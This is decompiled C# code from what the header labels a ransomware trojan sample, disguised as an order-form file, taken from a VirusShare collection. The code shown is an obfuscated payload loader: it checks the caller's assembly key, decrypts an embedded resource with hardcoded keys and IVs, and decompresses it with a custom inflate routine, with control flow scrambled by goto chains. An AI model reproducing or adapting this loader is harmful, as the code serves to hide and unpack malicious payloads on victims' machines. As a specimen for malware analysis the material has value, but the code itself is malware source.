// Decompiled with JetBrains decompiler
// Type: .
// Assembly: BBSW_Order_Form.pdfx, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 34CD51D5-5D79-41B6-BEDE-66B03349B490
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.Win32.Generic-cd007c9e35c8c6eb762d25c6e17d011415c73438989144d0f952e82b44cca8ba.exe

using \u0002;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace \u0004
{
  internal class \u0003
  {
    private static bool \u0001([In] Assembly obj0, [In] Assembly obj1)
    {
      byte[] publicKey1 = obj0.GetName().GetPublicKey();
      if (true)
        goto label_18;
label_1:
      byte[] publicKey2 = obj1.GetName().GetPublicKey();
      if (true)
        goto label_19;
label_2:
      byte[] numArray1;
      int num1 = numArray1 == null ? 1 : 0;
      byte[] numArray2;
      int num2;
      int num3;
      if (true)
      {
        num3 = numArray2 == null ? 1 : 0;
        num2 = num1;
      }
      else
        goto label_15;
label_4:
      int index;
      if (num2 != num3)
      {
        int num4 = 0;
        if (num4 == 0)
          return num4 != 0;
        num2 = num4;
      }
      else if (numArray1 != null)
      {
        if (true)
        {
          index = 0;
          goto label_16;
        }
        else
          goto label_16;
      }
      else
        goto label_17;
label_10:
      num3 = (int) numArray2[index];
      if (true)
      {
        if (num2 != num3)
          return false;
        if (true)
          num1 = index + 1;
        else
          goto label_2;
      }
      else
        goto label_4;
label_15:
      if (true)
        index = num1;
label_16:
      if (index < numArray1.Length)
      {
        num2 = (int) numArray1[index];
        goto label_10;
      }
label_17:
      return true;
label_19:
      numArray1 = publicKey2;
      goto label_2;
label_18:
      numArray2 = publicKey1;
      goto label_1;
    }

    public static byte[] \u0001([In] byte[] obj0)
    {
      Assembly callingAssembly = Assembly.GetCallingAssembly();
      if (true)
        goto label_51;
label_1:
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      if (true)
        goto label_52;
label_2:
      Assembly assembly1;
      Assembly assembly2;
      if ((object) assembly1 != (object) assembly2 && !\u0004.\u0003.\u0001(assembly2, assembly1))
        return (byte[]) null;
      \u0004.\u0003.\u0007 obj1 = new \u0004.\u0003.\u0007(obj0);
      if (true)
        goto label_53;
label_5:
      byte[] numArray1 = new byte[0];
      if (true)
        goto label_54;
label_6:
      \u0004.\u0003.\u0007 obj2;
      int num1 = obj2.\u0002();
      if (true)
        goto label_55;
label_7:
      int num2;
      int num3;
      if (num2 == 67324752)
      {
        int num4 = (int) (short) obj2.\u0001();
        if (true)
          goto label_56;
label_9:
        int num5 = obj2.\u0001();
        int num6 = obj2.\u0001();
        short num7;
        if (num2 != 67324752 || num7 != (short) 20 || num5 != 0 || num6 != 8)
          throw new FormatException("Wrong Header Signature");
        obj2.\u0002();
        obj2.\u0002();
        num3 = obj2.\u0002();
        goto label_12;
label_56:
        num7 = (short) num4;
        goto label_9;
      }
      else
        goto label_17;
label_12:
      int length1 = obj2.\u0002();
      int count1 = obj2.\u0001();
      int count2 = obj2.\u0001();
      if (count1 > 0)
      {
        byte[] buffer = new byte[count1];
        obj2.Read(buffer, 0, count1);
      }
label_14:
      if (count2 <= 0)
        goto label_16;
label_15:
      byte[] buffer1 = new byte[count2];
      obj2.Read(buffer1, 0, count2);
label_16:
      byte[] buffer2 = new byte[obj2.Length - obj2.Position];
      obj2.Read(buffer2, 0, buffer2.Length);
      \u0004.\u0003.\u0001 obj3 = new \u0004.\u0003.\u0001(buffer2);
      byte[] numArray2 = new byte[length1];
      obj3.\u0001(numArray2, 0, numArray2.Length);
      goto label_50;
label_17:
      int num8 = num2 >> 24;
      if (true)
      {
        if (num2 - (num8 << 24) != 8223355)
          throw new FormatException("Unknown Header");
        int length2;
        int num9;
        if (num8 == 1)
        {
          num3 = obj2.\u0002();
          if (true)
          {
            length2 = num3;
            if (true)
            {
              numArray2 = new byte[length2];
              num9 = 0;
              goto label_26;
            }
            else
              goto label_14;
          }
          else
            goto label_12;
        }
        else
          goto label_27;
label_25:
        int length3;
        byte[] buffer3 = new byte[length3];
        obj2.Read(buffer3, 0, buffer3.Length);
        int num10;
        new \u0004.\u0003.\u0001(buffer3).\u0001(numArray2, num9, num10);
        num9 += num10;
label_26:
        if (num9 < length2)
        {
          int num11 = obj2.\u0002();
          if (true)
          {
            num10 = obj2.\u0002();
            length3 = num11;
            goto label_25;
          }
          else
            goto label_40;
        }
label_27:
        if (num8 == 2)
        {
          byte[] numArray3 = new byte[8]
          {
            (byte) 81,
            (byte) 53,
            (byte) 31,
            (byte) 178,
            (byte) 215,
            (byte) 69,
            (byte) 98,
            (byte) 143
          };
          byte[] numArray4 = new byte[8]
          {
            (byte) 40,
            (byte) 6,
            (byte) 57,
            (byte) 96,
            (byte) 220,
            (byte) 19,
            (byte) 55,
            (byte) 58
          };
          using (\u0001 obj4 = new \u0001())
          {
            using (ICryptoTransform cryptoTransform = obj4.\u0001(numArray3, numArray4, true))
              numArray2 = \u0004.\u0003.\u0001(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
          }
        }
        byte[] numArray5;
        byte[] numArray6;
        if (num8 == 3)
        {
          length3 = 16;
          if (length3 != 0)
          {
            byte[] numArray7 = new byte[length3];
            // ISSUE: field reference
            RuntimeHelpers.InitializeArray((Array) numArray7, __fieldref (\u0005.\u0002.\u0003));
            numArray5 = numArray7;
            numArray6 = new byte[16]
            {
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2
            };
          }
          else
            goto label_25;
        }
        else
          goto label_50;
label_40:
        using (\u0003.\u0002 obj5 = new \u0003.\u0002())
        {
          using (ICryptoTransform cryptoTransform = obj5.\u0001(numArray5, numArray6, true))
            numArray2 = \u0004.\u0003.\u0001(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
        }
      }
      else
        goto label_15;
label_50:
      obj2.Close();
      return numArray2;
label_55:
      num2 = num1;
      goto label_7;
label_54:
      numArray2 = numArray1;
      goto label_6;
label_53:
      obj2 = obj1;
      goto label_5;
label_52:
      assembly2 = executingAssembly;
      goto label_2;
label_51:
      assembly1 = callingAssembly;
      goto label_1;
    }

    internal sealed class \u0001
    {
      private static readonly int[] \u0001;
      private static readonly int[] \u0002;
      private static readonly int[] \u0003;
      private static readonly int[] \u0004;
      private int \u0005;
      private int \u0006;
      private int \u0007;
      private int \u0008;
      private int \u000E;
      private bool \u000F;
      private \u0004.\u0003.\u0002 \u0010;
      private \u0004.\u0003.\u0003 \u0011;
      private \u0004.\u0003.\u0005 \u0012;
      private \u0004.\u0003.\u0004 \u0013;
      private \u0004.\u0003.\u0004 \u0014;

      public \u0001([In] byte[] obj0)
      {
        this.\u0010 = new \u0004.\u0003.\u0002();
        this.\u0011 = new \u0004.\u0003.\u0003();
        this.\u0005 = 2;
        this.\u0010.\u0001(obj0, 0, obj0.Length);
      }

      private bool \u0001()
      {
        int num1 = this.\u0011.\u0001();
        if (true)
          goto label_35;
label_32:
        int num2;
        int num3 = num2;
        int num4;
        for (int index1 = 258; num3 >= index1; num3 = num4)
        {
          int index2;
          int num5;
          do
          {
            int num6 = this.\u0005;
            if (true)
              goto label_36;
label_2:
            int num7;
            num4 = num7;
            num5 = 7;
            if (num5 != 0)
            {
              switch (num4 - num5)
              {
                case 0:
                  int num8;
                  do
                  {
                    int num9 = this.\u0013.\u0001(this.\u0010);
                    if (true)
                      goto label_39;
label_10:
                    if ((num9 & -256) != 0)
                      goto label_11;
label_5:
                    \u0004.\u0003.\u0003 obj = this.\u0011;
                    int num10 = index2;
                    if (true)
                      goto label_37;
label_6:
                    num8 = num2 - 1;
                    if (true)
                      goto label_38;
label_7:
                    continue;
label_38:
                    num2 = num8;
                    goto label_7;
label_37:
                    obj.\u0001(num10);
                    goto label_6;
label_11:
                    if (index2 < 257)
                    {
                      if (false)
                        goto label_5;
                      else
                        goto label_13;
                    }
                    else
                      goto label_17;
label_39:
                    index2 = num9;
                    goto label_10;
                  }
                  while (num8 >= 258);
                  return true;
label_13:
                  if (index2 < 0)
                    return false;
                  this.\u0014 = (\u0004.\u0003.\u0004) null;
                  this.\u0013 = (\u0004.\u0003.\u0004) null;
                  continue;
                case 1:
                  goto label_18;
                case 2:
                  goto label_24;
                case 3:
                  goto label_27;
                default:
                  goto label_32;
              }
            }
            else
              goto label_4;
label_36:
            num7 = num6;
            goto label_2;
          }
          while (false);
          this.\u0005 = 2;
          return true;
label_17:
          this.\u0007 = \u0004.\u0003.\u0001.\u0001[index2 - 257];
          this.\u0006 = \u0004.\u0003.\u0001.\u0002[index2 - 257];
label_18:
          if (this.\u0006 > 0)
          {
            this.\u0005 = 8;
            int num11 = this.\u0010.\u0001(this.\u0006);
            if (true)
              goto label_40;
label_20:
            int num12;
            if (num12 < 0)
              return false;
            this.\u0010.\u0001(this.\u0006);
            this.\u0007 += num12;
            goto label_23;
label_40:
            num12 = num11;
            goto label_20;
          }
label_23:
          this.\u0005 = 9;
label_24:
          index2 = this.\u0014.\u0001(this.\u0010);
          if (index2 < 0)
            return false;
          this.\u0008 = \u0004.\u0003.\u0001.\u0003[index2];
          this.\u0006 = \u0004.\u0003.\u0001.\u0004[index2];
label_27:
          if (this.\u0006 > 0)
          {
            this.\u0005 = 10;
            int num13 = this.\u0010.\u0001(this.\u0006);
            if (num13 < 0)
              return false;
            this.\u0010.\u0001(this.\u0006);
            this.\u0008 += num13;
          }
          this.\u0011.\u0001(this.\u0007, this.\u0008);
          num2 -= this.\u0007;
          this.\u0005 = 7;
          goto label_32;
label_4:
          index1 = num5;
        }
        return true;
label_35:
        num2 = num1;
        goto label_32;
      }

      private bool \u0002()
      {
        int num1;
        int num2;
        while (true)
        {
          int num3 = this.\u0005;
          if (true)
            goto label_40;
label_2:
          if (true)
          {
            int num4;
            int num5;
            switch (num1)
            {
              case 2:
                if (this.\u000F)
                {
                  this.\u0005 = 12;
                  return false;
                }
                int num6 = this.\u0010.\u0001(3);
                if (true)
                {
                  num2 = num6;
                  goto label_8;
                }
                else
                  goto label_8;
              case 3:
                int num7 = this.\u0010.\u0001(16);
                if (true)
                  goto label_45;
label_22:
                this.\u000E = num7;
                num4 = num1;
                num5 = 0;
                if (num5 == 0)
                {
                  if (num4 < num5)
                    return false;
                  this.\u0010.\u0001(16);
                  this.\u0005 = 4;
                  goto case 4;
                }
                else
                  break;
label_45:
                num1 = num7;
                goto label_22;
              case 4:
                int num8 = this.\u0010.\u0001(16);
                num5 = 0;
                num4 = num8;
                break;
              case 5:
label_30:
                this.\u000E -= this.\u0011.\u0001(this.\u0010, this.\u000E);
                if (this.\u000E != 0)
                  return !this.\u0010.\u0001();
                this.\u0005 = 2;
                return true;
              case 6:
                if (!this.\u0012.\u0001(this.\u0010))
                  return false;
                this.\u0013 = this.\u0012.\u0001();
                this.\u0014 = this.\u0012.\u0002();
                this.\u0005 = 7;
                goto case 7;
              case 7:
              case 8:
              case 9:
              case 10:
                return this.\u0001();
              case 12:
                return false;
              default:
                int num9 = 0;
                return num9 != 0 ? num9 != 0 : num9 != 0;
            }
            if (num4 < num5)
              return false;
            this.\u0010.\u0001(16);
            this.\u0005 = 5;
            goto label_30;
          }
          else
            continue;
label_40:
          num1 = num3;
          goto label_2;
        }
label_8:
        if (num2 < 0)
          return false;
        do
        {
          \u0004.\u0003.\u0002 obj1 = this.\u0010;
          if (true)
            goto label_42;
label_11:
          if ((num2 & 1) != 0)
            this.\u000F = true;
          int num10 = num2 >> 1;
          if (true)
            goto label_43;
label_14:
          switch (num1)
          {
            case 0:
              \u0004.\u0003.\u0002 obj2 = this.\u0010;
              if (true)
                goto label_44;
label_16:
              this.\u0005 = 3;
              goto label_20;
label_44:
              obj2.\u0001();
              goto label_16;
            case 1:
              this.\u0013 = \u0004.\u0003.\u0004.\u0002;
              this.\u0014 = \u0004.\u0003.\u0004.\u0003;
              this.\u0005 = 7;
              goto label_20;
            case 2:
              continue;
            default:
              goto label_20;
          }
label_43:
          num1 = num10;
          goto label_14;
label_42:
          obj1.\u0001(3);
          goto label_11;
        }
        while (false);
        this.\u0012 = new \u0004.\u0003.\u0005();
        this.\u0005 = 6;
label_20:
        return true;
      }

      public int \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        int num2;
        if (true)
        {
          int num3 = 0;
          if (num3 == 0)
          {
            if (true)
              num1 = num3;
          }
          else
          {
            num2 = num3;
            goto label_7;
          }
        }
        else
          goto label_9;
label_3:
        int num4 = this.\u0005;
        int num5 = 11;
        int num6;
        if (num5 != 0)
        {
          if (num4 != num5)
          {
            int num7 = this.\u0011.\u0001(obj0, obj1, obj2);
            if (true)
              goto label_19;
label_6:
            num2 = obj1;
            goto label_7;
label_19:
            num6 = num7;
            goto label_6;
          }
          else
            goto label_14;
        }
        else
          goto label_8;
label_7:
        num5 = num6;
        num4 = num2;
label_8:
        int num8 = num4 + num5;
        if (true)
          obj1 = num8;
label_9:
        int num9 = num1;
        if (true)
        {
          int num10 = num6;
          int num11 = num9 + num10;
          if (true)
            goto label_21;
label_11:
          int num12 = obj2 - num6;
          if (true)
            goto label_22;
label_12:
          if (obj2 == 0)
            return num1;
          goto label_14;
label_22:
          obj2 = num12;
          goto label_12;
label_21:
          num1 = num11;
          goto label_11;
        }
        else
          goto label_16;
label_14:
        if (!this.\u0002())
          num9 = this.\u0011.\u0002();
        else
          goto label_3;
label_16:
        if (num9 <= 0 || this.\u0005 == 11)
          return num1;
        goto label_3;
      }

      static \u0001()
      {
        do
        {
          int length1 = 29;
          int length2;
          while (true)
          {
            int[] numArray1 = new int[length1];
            // ISSUE: field reference
            RuntimeFieldHandle fldHandle1 = __fieldref (\u0005.\u0002.\u0005);
            if (true)
              goto label_9;
label_2:
            \u0004.\u0003.\u0001.\u0001 = numArray1;
            if (true)
            {
              int[] numArray2 = new int[29];
              // ISSUE: field reference
              RuntimeFieldHandle fldHandle2 = __fieldref (\u0005.\u0002.\u0006);
              if (true)
                goto label_10;
label_4:
              \u0004.\u0003.\u0001.\u0002 = numArray2;
              int[] numArray3 = new int[30];
              // ISSUE: field reference
              RuntimeFieldHandle fldHandle3 = __fieldref (\u0005.\u0002.\u0007);
              if (true)
                goto label_11;
label_5:
              \u0004.\u0003.\u0001.\u0003 = numArray3;
              length2 = 30;
              if (length2 == 0)
              {
                length1 = length2;
                continue;
              }
              break;
label_11:
              RuntimeHelpers.InitializeArray((Array) numArray3, fldHandle3);
              goto label_5;
label_10:
              RuntimeHelpers.InitializeArray((Array) numArray2, fldHandle2);
              goto label_4;
            }
            else
              goto label_8;
label_9:
            RuntimeHelpers.InitializeArray((Array) numArray1, fldHandle1);
            goto label_2;
          }
          int[] numArray = new int[length2];
          // ISSUE: field reference
          RuntimeFieldHandle fldHandle = __fieldref (\u0005.\u0002.\u0008);
          if (true)
            goto label_12;
label_7:
          \u0004.\u0003.\u0001.\u0004 = numArray;
          goto label_8;
label_12:
          RuntimeHelpers.InitializeArray((Array) numArray, fldHandle);
          goto label_7;
label_8:;
        }
        while (false);
      }
    }

    internal sealed class \u0002
    {
      private byte[] \u0001;
      private int \u0002 = 0;
      private int \u0003 = 0;
      private uint \u0004 = 0;
      private int \u0005 = 0;

      public int \u0001([In] int obj0)
      {
        if (this.\u0005 < obj0)
        {
          if (this.\u0002 == this.\u0003)
          {
            if (true)
              return -1;
          }
          else
          {
            \u0004.\u0003.\u0002 obj1 = this;
            int num1 = (int) obj1.\u0004;
            byte[] numArray1 = this.\u0001;
            \u0004.\u0003.\u0002 obj2 = this;
            int num2 = obj2.\u0002;
            if (true)
              goto label_14;
label_5:
            obj2.\u0002 = num2 + 1;
            int num3;
            int index1 = num3;
            int num4 = (int) numArray1[index1] & (int) byte.MaxValue;
            byte[] numArray2 = this.\u0001;
            \u0004.\u0003.\u0002 obj3 = this;
            int num5 = obj3.\u0002;
            if (true)
              goto label_15;
label_6:
            obj3.\u0002 = num5 + 1;
            int index2 = num3;
            int num6 = ((int) numArray2[index2] & (int) byte.MaxValue) << 8;
            int num7 = (num4 | num6) << this.\u0005;
            obj1.\u0004 = (uint) (num1 | num7);
            this.\u0005 += 16;
            goto label_7;
label_15:
            num3 = num5;
            goto label_6;
label_14:
            num3 = num2;
            goto label_5;
          }
        }
label_7:
        long num8 = (long) this.\u0004;
        int num9 = 1;
        int num10 = obj0;
        int num11;
        do
        {
          if (true)
          {
            int num12 = num10 & 31;
            num11 = num9 << num12;
            if (true)
            {
              num10 = 1;
              num9 = num11;
            }
            else
              goto label_16;
          }
        }
        while (num10 == 0);
        int num13 = num9 - num10;
        goto label_13;
label_16:
        num13 = num11;
label_13:
        long num14 = (long) num13;
        return (int) (num8 & num14);
      }

      public void \u0001([In] int obj0)
      {
label_0:
        this.\u0004 >>= obj0;
        do
        {
          if (true)
            this.\u0005 -= obj0;
          else
            goto label_0;
        }
        while (false);
      }

      [SpecialName]
      public int \u0001() => this.\u0005;

      [SpecialName]
      public int \u0002()
      {
        int num1 = this.\u0003;
        int num2;
        int num3;
        while (true)
        {
          num2 = this.\u0002;
          if (true)
          {
            num3 = num1 - num2;
            if (false)
              num1 = num3;
            else
              break;
          }
          else
            goto label_4;
        }
        num2 = this.\u0005;
        num1 = num3;
label_4:
        int num4;
        while (true)
        {
          num4 = num2 >> 3;
          if (false)
            num2 = num4;
          else
            break;
        }
        return num1 + num4;
      }

      public void \u0001()
      {
        this.\u0004 >>= this.\u0005 & 7;
        this.\u0005 &= -8;
      }

      [SpecialName]
      public bool \u0001() => this.\u0002 == this.\u0003;

      public int \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        int num1 = 0;
        int num2;
        int num3;
        while (true)
        {
          if (true)
            goto label_22;
label_6:
          int num4;
          while (true)
          {
            int num5;
            do
            {
              num3 = this.\u0005;
              if (true)
              {
                if (num3 <= 0)
                  goto label_10;
                else
                  goto label_8;
label_4:
                this.\u0004 >>= 8;
                this.\u0005 -= 8;
                int num6 = obj2 - 1;
                if (true)
                  goto label_24;
label_5:
                num5 = num2 + 1;
                continue;
label_24:
                obj2 = num6;
                goto label_5;
label_8:
                num4 = obj2;
                if (true)
                {
                  if (num4 > 0)
                  {
                    byte[] numArray = obj0;
                    int index = obj1;
                    int num7 = index + 1;
                    if (true)
                      goto label_23;
label_3:
                    int num8 = (int) (byte) this.\u0004;
                    numArray[index] = (byte) num8;
                    goto label_4;
label_23:
                    obj1 = num7;
                    goto label_3;
                  }
                }
                else
                  goto label_29;
label_10:
                if (obj2 != 0)
                {
                  int num9 = this.\u0003 - this.\u0002;
                  if (true)
                    goto label_26;
label_14:
                  int num10;
                  if (obj2 > num10)
                  {
                    int num11 = num10;
                    if (true)
                      obj2 = num11;
                  }
                  Array.Copy((Array) this.\u0001, this.\u0002, (Array) obj0, obj1, obj2);
                  this.\u0002 += obj2;
                  if ((this.\u0002 - this.\u0003 & 1) != 0)
                  {
                    this.\u0004 = (uint) this.\u0001[this.\u0002++] & (uint) byte.MaxValue;
                    this.\u0005 = 8;
                  }
                  if (false)
                    goto label_4;
                  else
                    goto label_19;
label_26:
                  num10 = num9;
                  goto label_14;
                }
                else
                  goto label_11;
              }
              else
                goto label_12;
            }
            while (false);
            num2 = num5;
          }
label_29:
          num1 = num4;
          continue;
label_22:
          num2 = num1;
          goto label_6;
        }
label_12:
        return num3;
label_11:
        return num2;
label_19:
        if (true)
        {
          int num12 = num2;
          if (false)
            return num12;
          int num13 = obj2;
          return num12 + num13;
        }
        goto label_11;
      }

      public void \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        if (true)
        {
          if (this.\u0002 < this.\u0003)
            throw new InvalidOperationException();
          int num2 = obj1 + obj2;
          if (true)
            goto label_11;
label_4:
          if (0 > obj1 || obj1 > num1 || num1 > obj0.Length)
            throw new ArgumentOutOfRangeException();
          if ((obj2 & 1) != 0)
          {
            \u0004.\u0003.\u0002 obj = this;
            int num3 = (int) obj.\u0004;
            byte[] numArray = obj0;
            int index = obj1;
            int num4 = index + 1;
            if (true)
              goto label_12;
label_8:
            int num5 = ((int) numArray[index] & (int) byte.MaxValue) << this.\u0005;
            obj.\u0004 = (uint) (num3 | num5);
            goto label_9;
label_12:
            obj1 = num4;
            goto label_8;
          }
          else
            goto label_10;
label_11:
          num1 = num2;
          goto label_4;
        }
label_9:
        this.\u0005 += 8;
label_10:
        this.\u0001 = obj0;
        this.\u0002 = obj1;
        this.\u0003 = num1;
      }
    }

    internal sealed class \u0003
    {
      private byte[] \u0001 = new byte[32768];
      private int \u0002 = 0;
      private int \u0003 = 0;

      public void \u0001([In] int obj0)
      {
        do
        {
          \u0004.\u0003.\u0003 obj1 = this;
          int num1 = obj1.\u0003;
          if (true)
            goto label_10;
label_1:
          obj1.\u0003 = num1 + 1;
label_2:
          int num2;
          if (true)
          {
            if (num2 != 32768)
              goto label_6;
label_4:
            continue;
label_6:
            byte[] numArray = this.\u0001;
            \u0004.\u0003.\u0003 obj2 = this;
            int num3 = obj2.\u0002;
            if (true)
              goto label_11;
label_7:
            obj2.\u0002 = num3 + 1;
            int index = num2;
            int num4 = (int) (byte) obj0;
            numArray[index] = (byte) num4;
            if (true)
            {
              if (false)
                goto label_2;
              else
                goto label_9;
            }
            else
              goto label_4;
label_11:
            num2 = num3;
            goto label_7;
          }
          else
            continue;
label_10:
          num2 = num1;
          goto label_1;
        }
        while (false);
        throw new InvalidOperationException();
label_9:
        this.\u0002 &= (int) short.MaxValue;
      }

      private void \u0001([In] int obj0, [In] int obj1, [In] int obj2)
      {
        if (false)
          return;
        while (true)
        {
          int num1;
          do
          {
            int num2 = obj1;
            int num3;
            while (true)
            {
              num3 = num2 - 1;
              if (false)
                num2 = num3;
              else
                break;
            }
            if (true)
              goto label_15;
label_10:
            if (num2 > 0)
            {
              byte[] numArray1 = this.\u0001;
              \u0004.\u0003.\u0003 obj = this;
              int num4 = obj.\u0002;
              if (true)
                goto label_12;
label_3:
              obj.\u0002 = num4 + 1;
              int num5;
              int index1 = num5;
              byte[] numArray2 = this.\u0001;
              int index2 = obj0;
              int num6 = index2 + 1;
              if (true)
                goto label_13;
label_4:
              int num7 = (int) numArray2[index2];
              numArray1[index1] = (byte) num7;
              this.\u0002 &= (int) short.MaxValue;
              num1 = obj0;
              if (true)
                num1 &= (int) short.MaxValue;
              continue;
label_13:
              obj0 = num6;
              goto label_4;
label_12:
              num5 = num4;
              goto label_3;
            }
            else
              goto label_16;
label_15:
            obj1 = num3;
            goto label_10;
          }
          while (false);
          obj0 = num1;
        }
label_16:;
      }

      public void \u0001([In] int obj0, [In] int obj1)
      {
        \u0004.\u0003.\u0003 obj2 = this;
        int num1 = obj2.\u0003 + obj0;
        if (true)
          goto label_14;
label_1:
        obj2.\u0003 = num1;
        int num2;
        if (num2 > 32768)
          throw new InvalidOperationException();
        int num3 = this.\u0002 - obj1 & (int) short.MaxValue;
        if (true)
          goto label_15;
label_4:
        int num4 = 32768 - obj0;
        if (true)
          goto label_16;
label_5:
        int num5;
        int num6;
        if (num5 <= num6 && this.\u0002 < num6)
        {
          if (obj0 <= obj1)
          {
            byte[] sourceArray = this.\u0001;
            int sourceIndex = num5;
            byte[] destinationArray = this.\u0001;
            int destinationIndex = this.\u0002;
            int length = obj0;
            if (true)
              goto label_17;
label_8:
            this.\u0002 += obj0;
            return;
label_17:
            Array.Copy((Array) sourceArray, sourceIndex, (Array) destinationArray, destinationIndex, length);
            goto label_8;
          }
          else
          {
            while (obj0-- > 0)
            {
              byte[] numArray1 = this.\u0001;
              \u0004.\u0003.\u0003 obj3 = this;
              int num7 = obj3.\u0002;
              if (true)
                goto label_18;
label_10:
              obj3.\u0002 = num7 + 1;
              int index1 = num2;
              byte[] numArray2 = this.\u0001;
              int index2 = num5;
              int num8 = index2 + 1;
              if (true)
                goto label_19;
label_11:
              int num9 = (int) numArray2[index2];
              numArray1[index1] = (byte) num9;
              continue;
label_19:
              num5 = num8;
              goto label_11;
label_18:
              num2 = num7;
              goto label_10;
            }
            return;
          }
        }
        else
        {
          this.\u0001(num5, obj0, obj1);
          return;
        }
label_16:
        num6 = num4;
        goto label_5;
label_15:
        num5 = num3;
        goto label_4;
label_14:
        num2 = num1;
        goto label_1;
      }

      public int \u0001([In] \u0004.\u0003.\u0002 obj0, [In] int obj1)
      {
        int val1 = obj1;
        if (true)
        {
          int val2 = 32768 - this.\u0003;
          val1 = Math.Min(val1, val2);
        }
        int val2_1 = obj0.\u0002();
        int num1 = Math.Min(val1, val2_1);
        int num2;
        while (true)
        {
          if (true)
            goto label_15;
label_4:
          num2 = 32768;
          if (num2 == 0)
          {
            num1 = num2;
            continue;
          }
          break;
label_15:
          obj1 = num1;
          goto label_4;
        }
        int num3 = num2 - this.\u0002;
        if (true)
          goto label_16;
label_6:
        int num4;
        int num5;
        do
        {
          if (obj1 > num4)
          {
            if (true)
            {
              int num6 = obj0.\u0001(this.\u0001, this.\u0002, num4);
              if (true)
                goto label_17;
label_9:
              if (num5 != num4)
                goto label_13;
              else
                goto label_10;
label_17:
              num5 = num6;
              goto label_9;
            }
label_10:
            int num7 = num5 + obj0.\u0001(this.\u0001, 0, obj1 - num4);
            if (true)
              num5 = num7;
          }
          else
          {
            int num8 = obj0.\u0001(this.\u0001, this.\u0002, obj1);
            if (true)
              num5 = num8;
          }
label_13:
          this.\u0002 = this.\u0002 + num5 & (int) short.MaxValue;
        }
        while (false);
        this.\u0003 += num5;
        return num5;
label_16:
        num4 = num3;
        goto label_6;
      }

      public int \u0001() => 32768 - this.\u0003;

      public int \u0002() => this.\u0003;

      public int \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        int num1 = this.\u0002;
        if (true)
          goto label_17;
label_1:
        int num2;
        int num3;
        int num4;
        if (obj2 > this.\u0003)
        {
          int num5 = this.\u0003;
          if (true)
            obj2 = num5;
        }
        else
        {
          num3 = this.\u0002 - this.\u0003;
          num4 = obj2;
          if (true)
          {
            int num6 = num3 + num4 & (int) short.MaxValue;
            if (true)
              num2 = num6;
          }
          else
            goto label_12;
        }
label_5:
        int num7;
        do
        {
          int num8 = obj2;
          if (true)
            goto label_20;
label_6:
          continue;
label_20:
          num7 = num8;
          goto label_6;
        }
        while (false);
        int num9 = obj2 - num2;
        if (true)
          goto label_21;
label_8:
        int num10;
        while (num10 > 0)
        {
          byte[] sourceArray = this.\u0001;
          int sourceIndex = 32768 - num10;
          byte[] destinationArray = obj0;
          int destinationIndex = obj1;
          int length = num10;
          if (true)
            goto label_22;
label_10:
          if (true)
          {
            int num11 = obj1;
            num4 = num10;
            num3 = num11;
            goto label_12;
          }
          else
            continue;
label_22:
          Array.Copy((Array) sourceArray, sourceIndex, (Array) destinationArray, destinationIndex, length);
          goto label_10;
        }
        goto label_13;
label_21:
        num10 = num9;
        goto label_8;
label_12:
        obj1 = num3 + num4;
        obj2 = num2;
label_13:
        Array.Copy((Array) this.\u0001, num2 - obj2, (Array) obj0, obj1, obj2);
        this.\u0003 -= num7;
        if (this.\u0003 < 0)
          throw new InvalidOperationException();
        if (true)
          return num7;
        goto label_5;
label_17:
        num2 = num1;
        goto label_1;
      }
    }

    internal sealed class \u0004
    {
      private short[] \u0001;
      public static readonly \u0004.\u0003.\u0004 \u0002;
      public static readonly \u0004.\u0003.\u0004 \u0003;

      static \u0004()
      {
        byte[] numArray1 = new byte[288];
        if (true)
          goto label_25;
label_1:
        if (true)
          goto label_26;
label_2:
        byte[] numArray2;
        int num1;
        if (true)
        {
          while (num1 < 144)
          {
            byte[] numArray3 = numArray2;
            int index = num1;
            int num2 = index + 1;
            if (true)
              goto label_27;
label_5:
            numArray3[index] = (byte) 8;
            continue;
label_27:
            num1 = num2;
            goto label_5;
          }
          if (true)
          {
            while (num1 < 256)
            {
              byte[] numArray4 = numArray2;
              int index = num1;
              int num3 = index + 1;
              if (true)
                goto label_28;
label_9:
              numArray4[index] = (byte) 9;
              continue;
label_28:
              num1 = num3;
              goto label_9;
            }
          }
          else
            goto label_19;
        }
        else
          goto label_17;
label_13:
        int num4;
        int num5;
        while (true)
        {
          num4 = num1;
          num5 = 280;
          if (num5 != 0)
          {
            if (num4 < num5)
            {
              byte[] numArray5 = numArray2;
              int index = num1;
              int num6 = index + 1;
              if (true)
                goto label_29;
label_12:
              numArray5[index] = (byte) 7;
              continue;
label_29:
              num1 = num6;
              goto label_12;
            }
            else
              goto label_17;
          }
          else
            break;
        }
        int num7 = num5;
        int num8 = num4;
        goto label_22;
label_17:
        while (num1 < 288)
        {
          byte[] numArray6 = numArray2;
          int index = num1;
          int num9 = index + 1;
          if (true)
            goto label_30;
label_16:
          numArray6[index] = (byte) 8;
          continue;
label_30:
          num1 = num9;
          goto label_16;
        }
        \u0004.\u0003.\u0004.\u0002 = new \u0004.\u0003.\u0004(numArray2);
        numArray2 = new byte[32];
label_19:
        num1 = 0;
label_21:
        num8 = num1;
        num7 = 32;
label_22:
        if (num8 < num7)
        {
          numArray2[num1++] = (byte) 5;
          goto label_21;
        }
        else
        {
          if (true)
          {
            \u0004.\u0003.\u0004.\u0003 = new \u0004.\u0003.\u0004(numArray2);
            return;
          }
          goto label_13;
        }
label_26:
        num1 = 0;
        goto label_2;
label_25:
        numArray2 = numArray1;
        goto label_1;
      }

      public \u0004([In] byte[] obj0) => this.\u0001(obj0);

      private void \u0001([In] byte[] obj0)
      {
        int[] numArray1 = new int[16];
        if (true)
          goto label_39;
label_1:
        int[] numArray2 = new int[16];
        if (true)
